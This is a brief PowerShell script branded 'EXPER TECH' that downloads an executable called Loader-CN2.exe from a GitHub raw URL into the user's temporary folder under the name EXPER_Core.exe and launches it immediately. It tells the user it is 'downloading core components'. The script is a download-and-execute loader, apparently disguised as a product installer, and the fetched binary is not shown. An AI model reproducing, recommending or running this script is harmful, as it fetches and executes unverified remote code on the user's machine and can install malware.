# 
Write-Host "E X P E R  T E C H" -ForegroundColor Cyan

# 
$Url = "https://raw.githubusercontent.com/zuiaixixibaobei-max/ZALS/refs/heads/main/Loader-CN2.exe"
$Path = "$env:TEMP\EXPER_Core.exe"

Write-Host "[>] Downloading core components..." -ForegroundColor Gray
Invoke-WebRequest -Uri $Url -OutFile $Path

# 
Start-Process $Path